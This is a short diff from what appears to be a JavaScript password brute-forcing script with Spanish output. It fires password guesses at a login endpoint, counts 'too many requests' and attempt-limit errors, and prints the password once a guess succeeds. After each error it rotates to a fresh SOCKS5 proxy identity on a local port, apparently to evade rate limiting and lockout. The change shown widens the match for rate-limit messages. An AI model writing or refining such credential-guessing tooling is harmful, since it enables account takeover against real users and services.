@@ -130,7 +130,7 @@ async function worker(){
 
         if(!data.data.includes("to many")){++num_de_peticiones};
 
-        if(data.data!=="error"){console.log("la contraseña es:",contraseña); found=true; process.exit(1)}}).catch(function(error){if(error.response && error.response.data.error.includes("intentos")){ ++N_tomany}
+        if(data.data!=="error"){console.log("la contraseña es:",contraseña); found=true; process.exit(1)}}).catch(function(error){if(error.response && (error.response.data.error.includes("intentos") || error.response.data.error.includes("many"))){ ++N_tomany}
         else if(N_tomany%100===0 && N_tomany!==0 && N_tomany!==N_tomany_repetido){N_tomany_repetido=N_tomany; console.log(N_tomany, "to many requests")}
         else{console.log("error:",error.cause)};++token;
         const  agent1 = new SocksProxyAgent(`socks5h://user_${token}:${token}@127.0.0.1:16379`,{keepAlive:true}); peticion(contraseña,body,agent1)})}}
